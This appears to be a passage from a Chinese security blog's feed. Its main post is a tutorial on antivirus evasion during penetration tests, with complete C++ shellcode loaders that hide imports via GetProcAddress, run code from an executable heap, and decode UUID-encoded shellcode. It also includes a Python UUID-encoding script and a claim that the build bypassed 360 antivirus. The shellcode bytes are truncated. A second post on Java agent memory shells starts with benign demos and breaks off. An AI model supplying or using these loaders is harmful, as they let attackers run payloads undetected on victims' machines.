<span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//内存保护属性</span></span><br><span class="line">DWORD oldProtect;</span><br><span class="line"><span class="type">int</span> size = <span class="built_in">sizeof</span>(buf);</span><br><span class="line">    <span class="comment">//申请普通的可读写的内存页</span></span><br><span class="line">LPVOID exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">RtlMoveMemory</span>(exec, buf, size);</span><br><span class="line">    <span class="comment">//改变为可执行</span></span><br><span class="line"><span class="built_in">VirtualProtect</span>(exec, size, PAGE_EXECUTE, &amp;oldProtect);</span><br><span class="line">((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改导入地址表">修改导入地址表</h2><p>在Windows操作系统中，当可执行文件或动态链接库（DLL）被加载时，系统需要知道它们所依赖的其他DLL中的函数的地址。这些地址被存储在<code>导入地址表</code>（Import Address  Table，简称IAT）中。IAT是一个由系统自动创建和维护的数据结构，它包含了导入模块中所有需要从其他模块中引用的函数的地址。</p><p>当一个模块被加载时，系统会根据该模块的导入描述符中的信息，为IAT中的每个导入函数填充正确的地址。这个过程被称为导入解析。如果一个模块依赖的DLL没有被加载，或者被加载但是没有导出所需的函数，导入解析就会失败，并且模块无法正常工作。</p><p>我们可以通过<code>peview</code>来查看导入表</p><p><img src="image-20230615162118302.png" alt="image-20230615162118302"></p><p>而杀软针对导入表也有自己的判断逻辑，当发现了<code>VirtualAlloc</code>、<code>VirtualProtect</code>等敏感函数在导入表中时，会判断该文件为高危文件</p><p>我们可以使用<code>GetProcAddress</code>函数来获取函数地址</p><p><code>GetProcAddress</code>是Windows API中的一个函数，它用于从动态链接库（DLL）中获取一个导出函数的地址。在Windows操作系统中，动态链接库是一种常见的代码共享机制，许多应用程序和系统组件都依赖于DLL中的函数。<code>GetProcAddress</code>函数可以让程序在运行时动态地链接到DLL中的函数，而不必在编译时将DLL中的函数链接到程序中。</p><p><code>GetProcAddress</code>函数的原型如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC GetProcAddress(</span><br><span class="line">  HMODULE hModule,  // DLL模块句柄</span><br><span class="line">  LPCSTR lpProcName // 导出函数名</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其中，<code>hModule</code>参数是DLL模块的句柄，可以使用<code>GetModuleHandle</code>函数加载DLL并获取该句柄；<code>lpProcName</code>参数是导出函数的名称，可以是一个字符指针，也可以是一个整数值，用于表示函数的序号。</p><p>首先是VirtualAlloc方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明指向 VirtualAlloc 函数的指针</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* LPVirtualAlloc)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化指针</span></span><br><span class="line">LPVirtualAlloc myVirtualAlloc = (LPVirtualAlloc)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br></pre></td></tr></table></figure><p>同理VirtualProtect方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明指向 VirtualProtect 函数的指针</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* LPVirtualProtect)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化指针</span></span><br><span class="line">LPVirtualProtect myVirtualProtect = (LPVirtualProtect)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br></pre></td></tr></table></figure><p>故代码转变为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/* length: 891 bytes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b......&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* LPVirtualAlloc)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* LPVirtualProtect)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">DWORD oldProtect;</span><br><span class="line">LPVirtualAlloc myVirtualAlloc = (LPVirtualAlloc)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">LPVirtualProtect myVirtualProtect = (LPVirtualProtect)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line"><span class="type">int</span> size = <span class="built_in">sizeof</span>(buf);</span><br><span class="line">LPVOID exec = <span class="built_in">myVirtualAlloc</span>(<span class="number">0</span>, size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">RtlMoveMemory</span>(exec, buf, size);</span><br><span class="line"><span class="built_in">myVirtualProtect</span>(exec, size, PAGE_EXECUTE, &amp;oldProtect);</span><br><span class="line">((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时用<code>peveiw</code>查看导入表发现已经不见<code>VirtualAlloc</code>和<code>VirtualProtect</code>了</p><p><img src="image-20230615191736134.png" alt="image-20230615191736134"></p><p>虽然导入表中已经没有<code>VirtualAlloc</code>了，但依赖于其他技术，杀软还是能检测到代码中使用了<code>VirtualAlloc</code>，也依旧还是会报毒</p><h2 id="利用HeapCreate替代VirtualAlloc">利用HeapCreate替代VirtualAlloc</h2><p><code>HeapCreate</code> 是 Windows API 中的一个函数，用于创建一个新的堆。函数原型如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">HeapCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD  flOptions,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T dwInitialSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T dwMaximumSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>flOptions</code>：是一个控制堆的标志位，可以是 <code>HEAP_GENERATE_EXCEPTIONS</code>、<code>HEAP_NO_SERIALIZE</code>、<code>HEAP_ZERO_MEMORY</code> 或它们的组合。</li><li><code>dwInitialSize</code>：指定堆的初始大小，单位为字节。</li><li><code>dwMaximumSize</code>：指定堆的最大大小，如果为 0，则表示堆的大小没有限制。</li></ul><p>则原来的<code>LPVOID exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</code>可以用以下代码替代:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个堆，设置 HEAP_CREATE_ENABLE_EXECUTE 和 HEAP_ZERO_MEMORY 标志位</span></span><br><span class="line">HANDLE hHeap = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, size);</span><br><span class="line"><span class="comment">// 在堆中分配内存，并将 shellcode 拷贝到分配的内存中</span></span><br><span class="line">PVOID exec = <span class="built_in">HeapAlloc</span>(hHeap, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br></pre></td></tr></table></figure><p>故整体代码为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/* length: 891 bytes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b......&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> size = <span class="built_in">sizeof</span>(buf);</span><br><span class="line"><span class="comment">// 创建一个堆，设置 HEAP_CREATE_ENABLE_EXECUTE 和 HEAP_ZERO_MEMORY 标志位</span></span><br><span class="line">HANDLE hHeap = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, size);</span><br><span class="line"><span class="comment">// 在堆中分配内存，并将 shellcode 拷贝到分配的内存中</span></span><br><span class="line">PVOID exec = <span class="built_in">HeapAlloc</span>(hHeap, <span class="number">0</span>, size);</span><br><span class="line"><span class="built_in">RtlMoveMemory</span>(exec, buf, size);</span><br><span class="line">((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>HeapCreate</code>可以躲避杀软对于<code>VirtualAlloc</code>的”追杀“</p><p>但这样的exe还是会被杀，因为buf中的静态shellcode太明显了，我们需要对shellcode进行加密</p><h2 id="shellcode加密">shellcode加密</h2><p>要说起shellcode加密方法，那可太多了，之前钓鱼用的<code>异或+base64</code>可以尝试，同时倾旋大佬提到的<code>UUID编码</code>也是一个不错的方法</p><p><code>UUID (通用唯一标识符) </code>是一个用于标识信息的 128 位数字，它可以保证在分布式计算环境中的唯一性。在 C/C++ 中，UUID  结构体通常被定义为一个包含 16 个字节的无符号字符数组，可以使用 Windows API 函数来生成 UUID 或将字符串转换为 UUID。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UUID 结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UUID</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Data[<span class="number">16</span>];</span><br><span class="line">&#125; UUID;</span><br></pre></td></tr></table></figure><p>在 Windows 操作系统中，可以使用命令行工具 <code>wmic</code> 来查看系统的 UUID，命令为 <code>wmic csproduct get UUID</code>。</p><p><img src="image-20230615205238426.png" alt="image-20230615205238426"></p><p>我们可以使用python加密脚本来将生成的bin文件进行uuid加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> UUID  <span class="comment"># 导入 Python 内置的 UUID 类</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage: python3 binToUUIDs.py shellcode.bin [--print]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  ____  _    _______    _    _ _    _ _____ _____       </span></span><br><span class="line"><span class="string"> |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      </span></span><br><span class="line"><span class="string"> | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  </span></span><br><span class="line"><span class="string"> |  _ &lt;| | &#x27;_ \| |/ _ \| |  | | |  | | | | | |  | / __| </span></span><br><span class="line"><span class="string"> | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ </span></span><br><span class="line"><span class="string"> |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/</span></span><br><span class="line"><span class="string">\n&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># 打印程序标题，使用了 ASCII 艺术字</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:  <span class="comment"># 打开二进制文件，以二进制模式读取</span></span><br><span class="line">    <span class="built_in">bin</span> = f.read()  <span class="comment"># 读取文件内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">2</span>] == <span class="string">&quot;--print&quot;</span>:</span><br><span class="line">    outputMapping = <span class="literal">True</span>  <span class="comment"># 如果命令行参数中有 &quot;--print&quot;，则输出转换前后的映射关系</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    outputMapping = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span>  <span class="comment"># 偏移量初始化为 0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Length of shellcode: &#123;&#125; bytes\n&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>)))  <span class="comment"># 打印 shellcode 的长度</span></span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span>  <span class="comment"># 初始化输出字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(offset &lt; <span class="built_in">len</span>(<span class="built_in">bin</span>)):  <span class="comment"># 遍历 shellcode 中的每 16 个字节</span></span><br><span class="line">    countOfBytesToConvert = <span class="built_in">len</span>(<span class="built_in">bin</span>[offset:])  <span class="comment"># 计算还剩多少字节需要转换</span></span><br><span class="line">    <span class="keyword">if</span> countOfBytesToConvert &lt; <span class="number">16</span>:  <span class="comment"># 如果不足 16 个字节</span></span><br><span class="line">        ZerosToAdd = <span class="number">16</span> - countOfBytesToConvert  <span class="comment"># 计算需要补多少个 0</span></span><br><span class="line">        byteString = <span class="built_in">bin</span>[offset:] + (<span class="string">b&#x27;\x00&#x27;</span>* ZerosToAdd)  <span class="comment"># 在末尾补 0</span></span><br><span class="line">        uuid = UUID(bytes_le=byteString)  <span class="comment"># 将 byteString 转换成 UUID</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        byteString = <span class="built_in">bin</span>[offset:offset+<span class="number">16</span>]  <span class="comment"># 取出 16 个字节</span></span><br><span class="line">        uuid = UUID(bytes_le=byteString)  <span class="comment"># 将 byteString 转换成 UUID</span></span><br><span class="line">    offset+=<span class="number">16</span>  <span class="comment"># 偏移量加 16</span></span><br><span class="line"></span><br><span class="line">    out += <span class="string">&quot;\&quot;&#123;&#125;\&quot;,\n&quot;</span>.<span class="built_in">format</span>(uuid)  <span class="comment"># 将 UUID 添加到 out 中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> outputMapping:  <span class="comment"># 如果需要输出映射关系</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; -&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(byteString, uuid))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>] + <span class="string">&quot;UUIDs&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  <span class="comment"># 将转换后的 UUID 写入到文件中</span></span><br><span class="line">    f.write(out)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Outputted to: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">1</span>] + <span class="string">&quot;UUIDs&quot;</span>))  <span class="comment"># 打印输出文件的路径</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="image-20230615220751829.png" alt="image-20230615220751829"></p><p>然后将加密的shellcode加载到内存里去</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">//不弹出交互端口</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* buf[] = &#123;</span><br><span class="line"><span class="string">&quot;e48348fc-e8f0-00c8-0000-415141505251&quot;</span>,</span><br><span class="line"><span class="string">&quot;d2314856-4865-528b-6048-8b5218488b52&quot;</span>,</span><br><span class="line"><span class="string">&quot;728b4820-4850-b70f-4a4a-4d31c94831c0&quot;</span>,</span><br><span class="line"><span class="string">&quot;7c613cac-2c02-4120-c1c9-0d4101c1e2ed&quot;</span>,</span><br><span class="line"><span class="string">&quot;……&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"><span class="comment">// 获取数组 buf 中元素个数</span></span><br><span class="line"><span class="type">int</span> dwNum = <span class="built_in">sizeof</span>(buf) / <span class="built_in">sizeof</span>(buf[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// 创建一个堆，并返回一个句柄</span></span><br><span class="line">HANDLE hMemory = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hMemory == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在堆中分配 1024 字节的内存，并返回指向这段内存的指针</span></span><br><span class="line">PVOID pMemory = <span class="built_in">HeapAlloc</span>(hMemory, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">DWORD_PTR CodePtr = (DWORD_PTR)pMemory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dwNum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (CodePtr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将字符串转换成 UUID，并将结果存储在指向内存的指针 CodePtr 中</span></span><br><span class="line">RPC_STATUSstatus = <span class="built_in">UuidFromStringA</span>(<span class="built_in">RPC_CSTR</span>(buf[i]), (UUID*)CodePtr);</span><br><span class="line"><span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">CodePtr += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pMemory == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">((<span class="built_in">void</span>(*)())pMemory)();</span><br><span class="line">    <span class="comment">//加个输出来骗杀软</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Hello World!\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中涉及到一个<code>UuidFromStringA</code>函数，该函数的作用是将一个字符串表示的 UUID 转换为一个 UUID 结构体类型的变量。其中，第一个参数是一个字符串，表示要转换的 UUID，第二个参数是一个指向 UUID 结构体类型的指针变量，表示转换后的结果。</p><p>生成的exe成功在360免杀（2023.6.15测试）</p><p><img src="image-20230615221347000.png" alt="image-20230615221347000"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在渗透的过程中会经常遇到对方机器安装了杀软的情况，这时就需要用到免杀技术，之前钓鱼邮件中提到的免杀是用GO写的，但我觉得这种东西还是更靠近计算机底层为好，正好这几天看了&lt;a href=&quot;https://payloads.online&quot;&gt;倾旋大佬的博客&lt;/a&gt;，对于用c++来</summary>
      
    
    
    
    <category term="技术" scheme="http://example.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>agent内存马学习</title>
    <link href="http://example.com/post/agent%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/post/agent%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-06-06T06:57:17.000Z</published>
    <updated>2023-06-15T15:28:46.779Z</updated>
    
    <content type="html"><![CDATA[<p>在Java中,agent是一种可以在运行时修改字节码的机制,它可以用来实现诸如性能监控、代码覆盖率分析、日志记录等功能。java agent主要分为两种——<code>premain</code>和<code>agentmain</code></p><h1 id="premain">premain</h1><p>首先新建一个maven项目,并创建一个<code>PreDemo</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PreDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello I`m premain agent!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建<code>META-INF/MANIFEST.MF</code>,需要指定<code>Premain-Class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Premain-Class: PreDemo</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p><img src="image-20230611153956891.png" alt="image-20230611153956891"></p><p>打包生成<code>ttagent.jar</code></p><p><img src="image-20230611154005520.png" alt="image-20230611154005520"></p><p>再新建一个maven项目,并创建一个<code>HelloDemo</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello !!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样打包生成<code>hello.jar</code></p><p>将两个jar包放到同一目录下</p><p>运行<code>java -javaagent:ttagent -jar hello.jar</code></p><p><img src="image-20230611154151348.png" alt="image-20230611154151348"></p><p>可以发现是先运行的的<code>ttagent.jar</code>然后才是<code>hello.jar</code></p><h1 id="agentmain">agentmain</h1><p><code>agentmain</code>是在java程序运行中被调用的方法,可以通过<code>VirtualMachine</code>向指定pid的jvm插入agentadmin程序</p><p>首先写一个<code>AgentDemo</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation 